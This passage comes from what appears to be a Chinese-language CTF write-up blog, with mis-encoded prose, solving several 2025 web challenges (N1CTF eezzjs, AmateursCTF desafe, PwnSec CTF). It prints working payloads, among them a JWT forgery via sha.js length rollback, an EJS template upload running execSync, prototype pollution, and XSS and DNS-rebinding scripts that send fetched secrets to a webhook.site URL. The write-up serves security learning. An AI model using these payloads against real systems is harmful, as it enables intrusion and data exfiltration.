class="attribute">f_u_linux_</span>:sad:!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="N1CTF-2025-eezzjs"><a href="#N1CTF-2025-eezzjs" class="headerlink" title="N1CTF 2025 eezzjs"></a>N1CTF 2025 eezzjs</h2><p>è¿™é‡Œæ€è·¯æ¯”è¾ƒç›´æ¥ï¼šçªç ´JWTæ ¡éªŒï¼Œä¸Šä¼ ï¼Œç„¶ååˆ©ç”¨SSTIå‘½ä»¤æ‰§è¡Œæ¥è·å–Flag.</p>
<p>è¿™ä¸ªåˆ†æè´¹åŠ²äº†ä¸€ä¼šï¼Œéƒ½å¿«åˆ†æå‡ºæ¥äº†ï¼Œç„¶åä¸€æœç´¢ï¼Œç»“æœå‘ç°æ˜¯ä¸ªCVE. </p>
<p><a href="https://github.com/advisories/GHSA-95m3-7q98-8xr5" target="_blank" rel="noopener">https://github.com/advisories/GHSA-95m3-7q98-8xr5</a></p>
<p>æ ¸å¿ƒå°±æ˜¯ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹è±¡æœ‰lengthå±æ€§ï¼Œå¯ä»¥è®¾ç½®æˆè´Ÿæ•°ï¼Œå®ç°å›æ»šã€‚</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; require('sha.js')('sha256').update('foo').digest('hex')</span><br><span class="line">'2c26b46b68ffc68ff99b453c1d<span class="number">3041341342</span>2d<span class="number">706483</span>bfa0f98a5e<span class="number">886266</span>e7ae'</span><br><span class="line">&gt; require('sha.js')('sha256').update('fooabc').update(&#123;length:-<span class="number">3</span>&#125;).digest('hex')</span><br><span class="line">'2c26b46b68ffc68ff99b453c1d<span class="number">3041341342</span>2d<span class="number">706483</span>bfa0f98a5e<span class="number">886266</span>e7ae'</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®ä¸­ï¼Œä¼ å…¥äº†ä¸‰ä¸ªå‚æ•°è¿›è¡Œï¼Œå‰ä¸¤ä¸ªéƒ½æ˜¯å¯æ§çš„ï¼Œä¸»è¦æ˜¯æœ€åä¸€ä¸ªsecretæ˜¯æœªçŸ¥çš„ã€‚</p>
<p>è¿™é‡Œçš„å…³é”®ç‚¹å°±æ˜¯ï¼Œå›æ»šçš„é•¿åº¦æŠŠsecretå’Œheaderçš„é•¿åº¦éƒ½ç®—ä¸Šã€‚</p>
<p>è¿™æ ·ç®—ä¸‹æ¥ é•¿åº¦æ˜¯45ï¼Œé‚£ä¹ˆpayloadå°±æ˜¯<code>{&quot;length&quot;:-45}</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sha256 = <span class="function">(<span class="params">...messages</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> hash = sha(<span class="string">'sha256'</span>);</span><br><span class="line">    messages.forEach(<span class="function">(<span class="params">m</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">typeof</span> m);</span><br><span class="line">        <span class="built_in">console</span>.log(m);</span><br><span class="line">        hash.update(m);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> hash.digest(<span class="string">'hex'</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> expectedSignatureHex = sha256(...[<span class="built_in">JSON</span>.stringify(header), payload, secret]);</span><br></pre></td></tr></table></figure>

<p>ç„¶åæœ¬åœ°è°ƒè¯• æ‹¿åˆ°å“åº”çš„ç­¾åå€¼æ˜¯674dcdbbb09261235ee8efc1999daee725dad0ec314a8d1d80cb11229e7596c1</p>
<p>æœ€åTokenæ˜¯ <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZW5ndGgiOi00NX0=.674dcdbbb09261235ee8efc1999daee725dad0ec314a8d1d80cb11229e7596c1</code></p>
<p><img src="https://lh3.googleusercontent.com/d/1PjncwFhY-OSydH8jPX6ETNnOKmrHfnLa" alt></p>
<p>ç„¶åæ˜¯çªç ´ä¸Šä¼  æ–‡ä»¶åç¼€ä¸å…è®¸å‡ºç°jså­—ç¬¦ä¸²ã€‚</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (/js/i.test(ext)) &#123;</span><br><span class="line">    <span class="keyword">return</span>  res.status(<span class="number">403</span>).<span class="built_in">send</span>(<span class="string">'Denied filename'</span>)<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¸©äº†ç‚¹å‘ï¼Œæ€è·¯ä¹±äº†ï¼Œåº”è¯¥ç”¨æ’é™¤æ³•ï¼Œç¡®å®šä¸€äº›å·²ç»èƒ½å¤Ÿå®šä¸‹æ¥çš„ä¸œè¥¿ï¼Œå†ä»æ—è¾¹å»çªç ´ã€‚<br>ä¾‹å¦‚è¿™é‡Œä¸€å®šç¡®å®šäº†ä¸€å®šä½¿ç”¨ejsï¼Œé‚£å‰©ä¸‹çªç ´åº”è¯¥æ˜¯ä¸»è¦åœ¨ä¸Šä¼ ã€‚</p>
<p>æœ€åä¸Šä¼ çš„payload.</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"filename"</span>:<span class="string">"../views/flag3.ejs/."</span>,<span class="attr">"filedata"</span>:<span class="string">"ew0KICAiZmlsZW5hbWUiOiAic2hlbGwuZWpzIiwNCiAgImZpbGVkYXRhIjogIjwlPSBnbG9iYWwucHJvY2Vzcy5tYWluTW9kdWxlLnJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjU3luYygnY2F0IC9mbGFnJykudG9TdHJpbmcoKSAlPiINCn0="</span>&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://lh3.googleusercontent.com/d/1KD1GTWcsKWSMFbeyaG43OjqyB0CtKP3Z" alt></p>
<p>ç¾¤é‡Œçœ‹åˆ°ä¸€ç§æ›´æœ‰æ„æ€çš„è§£æ³•</p>
<blockquote>
<p>upload pwned.pwned to /app/views/pwned.pwned: {â€œfilenameâ€:â€../views/pwned.pwnedâ€,â€filedataâ€:â€dGVzdAo=â€}</p>
</blockquote>
<p>upload pwned to /app/node_modules/:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"filename"</span>:<span class="string">"../node_modules/pwned"</span>,<span class="attr">"filedata"</span>:<span class="string">"ZnVuY3Rpb24gX19leHByZXNzKCkgewogICAgY29uc29sZS5sb2coJ3B3bmVkYicpOwp9Cgptb2R1bGUuZXhwb3J0cyA9IHsgX19leHByZXNzIH07"</span>&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__express</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'pwnedb'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123; __express &#125;;</span><br></pre></td></tr></table></figure>

<h2 id="AmateursCTF-2025-web-desafe"><a href="#AmateursCTF-2025-web-desafe" class="headerlink" title="AmateursCTF 2025 web/desafe"></a>AmateursCTF 2025 web/desafe</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; serve &#125; <span class="keyword">from</span> <span class="string">'@hono/node-server'</span></span><br><span class="line"><span class="keyword">import</span> &#123; Hono &#125; <span class="keyword">from</span> <span class="string">'hono'</span></span><br><span class="line"><span class="keyword">import</span> &#123; readFileSync &#125; <span class="keyword">from</span> <span class="string">'fs'</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> devalue <span class="keyword">from</span> <span class="string">'devalue'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Hono()</span><br><span class="line"><span class="keyword">const</span> FLAG = readFileSync(<span class="string">'flag.txt'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FlagRequest</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(feedback) &#123;</span><br><span class="line">    <span class="comment">// your feedback is greatly appreciated!</span></span><br><span class="line">    <span class="keyword">delete</span> &#123; feedback &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">get</span> flag() &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.admin) &#123;</span><br><span class="line">      <span class="keyword">return</span> FLAG;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"haha nope"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, (c) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> c.text(<span class="string">`POST /</span></span><br><span class="line"><span class="string">Body: FlagRequest(feedback), must be devalue stringified`</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/'</span>, <span class="keyword">async</span> (c) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> body = <span class="keyword">await</span> c.req.text();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> flagRequest = devalue.parse(body, &#123;</span><br><span class="line">    FlagRequest: <span class="function">(<span class="params">[a]</span>) =&gt;</span> <span class="keyword">new</span> FlagRequest(a),</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(flagRequest <span class="keyword">instanceof</span> FlagRequest)) <span class="keyword">return</span> c.text(<span class="string">'not a flag request'</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> c.text(flagRequest.flag)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">serve(&#123;</span><br><span class="line">  fetch: app.fetch,</span><br><span class="line">  port: <span class="number">3000</span></span><br><span class="line">&#125;, (info) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Server is running on http://localhost:<span class="subst">$&#123;info.port&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>CVE-2025-57820 <a href="https://github.com/advisories/GHSA-vj54-72f3-p5jv" target="_blank" rel="noopener">https://github.com/advisories/GHSA-vj54-72f3-p5jv</a></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;<span class="attr">"x"</span>:<span class="number">1</span>,<span class="attr">"y"</span>:<span class="number">2</span>,<span class="attr">"admin"</span>:<span class="number">3</span>,<span class="attr">"__proto__"</span>:<span class="number">4</span>&#125;,<span class="number">3</span>,<span class="number">4</span>,<span class="literal">true</span>,[<span class="string">"FlagRequest"</span>,<span class="number">5</span>],[<span class="number">6</span>,<span class="number">7</span>],<span class="number">8</span>,<span class="number">9</span>]</span><br></pre></td></tr></table></figure>

<p><img src="https://lh3.googleusercontent.com/d/1hl5Q1CVxMcj2pG2ytGSYjTz_6_Xkft8E" alt></p>
<h2 id="PwnSec-CTF-2025-A-Very-Safe-Locker-Indeed"><a href="#PwnSec-CTF-2025-A-Very-Safe-Locker-Indeed" class="headerlink" title="PwnSec CTF 2025 | A Very Safe Locker Indeed"></a>PwnSec CTF 2025 | A Very Safe Locker Indeed</h2><p>å‡å»è´Ÿæ•°é‡‘é¢ å°±æ˜¯åŠ ä¸Š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> transaction_amount = <span class="built_in">parseFloat</span>(amount) * <span class="number">1.01</span> <span class="comment">// Include 1% fee</span></span><br><span class="line"><span class="keyword">if</span> (user_from.mainBalance &gt;= transaction_amount &amp;&amp; transaction_amount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  user_from.mainBalance -= transaction_amount</span><br><span class="line">  <span class="keyword">await</span> user_from.save()</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">    user: req.user,</span><br><span class="line">    balance: user_from.mainBalance,</span><br><span class="line">    failMessage: <span class="string">'Insufficient balance to cover the transfer and fees.'</span>,</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/transfer</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 1962bfce2e7d7acb.chal.ctf.ae</span><br><span class="line"><span class="attribute">Cookie</span>: session=s%3Aj%3A%7B%22userId%22%3A%226918ab0eeb20bf4d1b5e4628%22%2C%22firstName%22%3A%22test%22%2C%22lastName%22%3A%22test%22%2C%22phoneNumber%22%3A%222323232%22%2C%22email%22%3A%22a%40qq.com%22%7D.a5boElllkfAE6N3GSsk6aFbx5ombeTAdwjcE0lXxxFg</span><br><span class="line"><span class="attribute">Content-Length</span>: 65</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span>: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span>: ?0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span>: "Windows"</span><br><span class="line"><span class="attribute">Origin</span>: https://1962bfce2e7d7acb.chal.ctf.ae</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span>: ?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: document</span><br><span class="line"><span class="attribute">Referer</span>: https://1962bfce2e7d7acb.chal.ctf.ae/</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span>: en,zh-CN;q=0.9,zh-HK;q=0.8,zh;q=0.7</span><br><span class="line"><span class="attribute">Priority</span>: u=0, i</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"></span><br><span class="line">receiverInfo=6918ab0eeb20bf4d1b5e46281&amp;amount=-100000000000000000</span><br></pre></td></tr></table></figure>

<p>ç»•è¿‡cspï¼Œæ³¨æ„é—­åˆ</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/locker?<span class="attribute">userMessage</span>=\"&#125;`;alert(1);<span class="attribute">a</span>=``</span><br></pre></td></tr></table></figure>

<p><img src="https://lh3.googleusercontent.com/d/1YopmG6r9INKHmKJ6iD_EMiLhH_Yv3EYQ" alt></p>
<p>è·å– /master/confedential å“åº”ç»“æœç„¶åä½¿ç”¨locationé‡å®šå‘è¿›è¡Œå¤–å‘ã€‚</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">"&#125;`;fetch(`/master/confedential`).then(Function.prototype.call.bind(Response.prototype.text)).then(function(t)&#123;location.href=`https://webhook.site/8ca58cbe-0061-4107-a28b-d6e522e77be5?`+t&#125;);a=`</span></span><br></pre></td></tr></table></figure>

<p><img src="https://lh3.googleusercontent.com/d/1TgSelSPpFjnHfzwrcPZt0dRJifhJNKyW" alt></p>
<h2 id="PwnSec-CTF-2025-OhMyPP"><a href="#PwnSec-CTF-2025-OhMyPP" class="headerlink" title="PwnSec CTF 2025 | OhMyPP"></a>PwnSec CTF 2025 | OhMyPP</h2><p>åŸå‹é“¾æ±¡æŸ“ï¼ŒæŠŠå¯æ‰§è¡Œè·¯å¾„æ¢æˆä¸Šä¼ çš„æ–‡ä»¶ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/report</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 1f4e39599ee9b212.chal.ctf.ae</span><br><span class="line"><span class="attribute">Content-Length</span>: 171</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span>: "Windows"</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span>: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span>: ?0</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Origin</span>: https://1f4e39599ee9b212.chal.ctf.ae</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: empty</span><br><span class="line"><span class="attribute">Referer</span>: https://1f4e39599ee9b212.chal.ctf.ae/report</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span>: en,zh-CN;q=0.9,zh-HK;q=0.8,zh;q=0.7</span><br><span class="line"><span class="attribute">Priority</span>: u=1, i</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;"username": "__proto__",</span><br><span class="line">        "issue": "executablePath",</span><br><span class="line">        "description": "/app/static/16976a3b3c7ae6b11cf3523983fa2bf2",</span><br><span class="line">        "url": "http://example.com"&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://lh3.googleusercontent.com/d/1Qbx0NKlBt7drVni9d2QEiidFOTb-4PEk" alt></p>
<h2 id="PwnSec-CTF-2025-FireLeak"><a href="#PwnSec-CTF-2025-FireLeak" class="headerlink" title="PwnSec CTF 2025 | FireLeak"></a>PwnSec CTF 2025 | FireLeak</h2><p>ä¸»è¦ç”¨äº†ä¸€ä¸ªtrickï¼Œè®©æµè§ˆå™¨é‡æ–°è·å–IPã€‚åˆå§‹ipç›´æ¥æ‹’æ”¶æµé‡ã€‚<br>è¿™é‡Œæˆ‘ç”¨çš„pythonçš„base httpï¼Œç›´æ¥æ‹’æ”¶æœåŠ¡ã€‚</p>
<p>è¸©äº†ä¸ªå¤§å‘ï¼Œwebhookä¸€ç›´æ”¶ä¸åˆ°ï¼ŒåŸæ¥æ˜¯è§¦å‘äº†webhookçš„é£æ§ï¼Œç›´æ¥æŠŠæˆ‘ç»™banäº†ã€‚ç»äº†ï¼Œæµªè´¹æ—¶é—´ã€‚</p>
<p>DNSé‡ç»‘å®šï¼Œç”¨äº†è¿™ä¸ªæœåŠ¡ï¼š</p>
<ul>
<li><a href="http://dnsrebindtool.43z.one/" target="_blank" rel="noopener">http://dnsrebindtool.43z.one/</a></li>
<li><a href="https://lock.cmpxchg8b.com/rebinder.html" target="_blank" rel="noopener">https://lock.cmpxchg8b.com/rebinder.html</a></li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Payload<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line">            </span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> firstErrorSent = <span class="literal">false</span>;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> interval_xhr = setInterval(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123; </span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">                xhr.open(<span class="string">'GET'</span>, <span class="string">'/flag'</span>, <span class="literal">false</span>); </span></span><br><span class="line">                </span><br><span class="line"><span class="actionscript">                <span class="keyword">try</span> &#123;</span></span><br><span class="line">                    xhr.send();</span><br><span class="line"><span class="actionscript">                &#125; <span class="keyword">catch</span> (error) &#123;</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">if</span> (!firstErrorSent) &#123;</span></span><br><span class="line"><span class="javascript">                        navigator.sendBeacon(<span class="string">'https://webhook.site/8ca58cbe-0061-4107-a28b-d6e522e77be5?catch_error='</span> + <span class="built_in">encodeURIComponent</span>(error.message));</span></span><br><span class="line"><span class="actionscript">                        firstErrorSent = <span class="literal">true</span>;</span></span><br><span class="line">                    &#125;</span><br><span class="line"><span class="actionscript">                    <span class="keyword">return</span>; </span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">                <span class="keyword">if</span> (xhr.status !== <span class="number">404</span> &amp;&amp; xhr.status !== <span class="number">0</span>) &#123;</span></span><br><span class="line">                    clearInterval(interval_xhr);</span><br><span class="line"><span class="actionscript">                    navigator.sendBeacon(<span class="string">'https://webhook.site/8ca58cbe-0061-4107-a28b-d6e522e77be5?status_xhr='</span> + xhr.status, xhr.responseText);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, 500);</span><br><span class="line"></span><br><span class="line">        &#125;, 10);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="PwnSec-CTF-2025-PSPD"><a href="#PwnSec-CTF-2025-PSPD" class="headerlink" title="PwnSec CTF 2025 | PSPD"></a>PwnSec CTF 2025 | PSPD</h2><p>è¿™ä¸ªXSSçš„è¾“å‡ºç‚¹ï¼Œç»™äº†ä¸ªéå¸¸è¿·æƒ‘æ€§çš„ç©æ„ï¼Œè®©äººè§‰å¾—æ˜¯ç”¨æˆ·åæ³¨å…¥ã€‚</p>
<p>ä½†å…¶å®æµè§ˆå™¨jsä¸­ï¼Œidåå­—å¯ä»¥ç›´æ¥jsä¸­ä½¿ç”¨ã€‚</p>
<p>æ‰€ä»¥ï¼Œä¸€ä¸ªaæ ‡ç­¾ï¼Œidåå­—å–æˆuserDataã€‚</p>
<p><code>&lt;a href=&quot;https://%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%20%2F%3E@x.com&quot; id=&quot;userData&quot;&gt;&lt;/a&gt;</code></p>
<p>é‚£ä¹ˆ userData.username å–çš„æ˜¯hrefé“¾æ¥é‡Œçš„é‚£éƒ¨åˆ†â€¦â€¦</p>
<p>ä¹Ÿå¤ªtrickäº†â€¦..</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">userDataElement.insertAdjacentHTML(</span><br><span class="line"><span class="string">"beforeend"</span>,</span><br><span class="line"><span class="string">`&lt;p style='margin-top: 3rem;'&gt;Not agent &lt;b&gt;<span class="subst">$&#123;<span class="built_in">decodeURIComponent</span>(</span></span></span><br><span class="line"><span class="string"><span class="subst">    userData.username</span></span></span><br><span class="line"><span class="string"><span class="subst">)&#125;</span>&lt;/b&gt;? Report this incident to +111-337-1337&lt;/p&gt;`</span></span><br><span class="line">);</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="built_in">console</span>.error(err);</span><br></pre></td></tr></table></figure>

<h2 id="PwnSec-CTF-2025-MaxPayne"><a href="#PwnSec-CTF-2025-MaxPayne" class="headerlink" title="PwnSec CTF 2025 | MaxPayne"></a>PwnSec CTF 2025 | MaxPayne</h2><p><a href="https://github.com/pallets/werkzeug/issues/2833" target="_blank" rel="noopener">https://github.com/pallets/werkzeug/issues/2833</a></p>
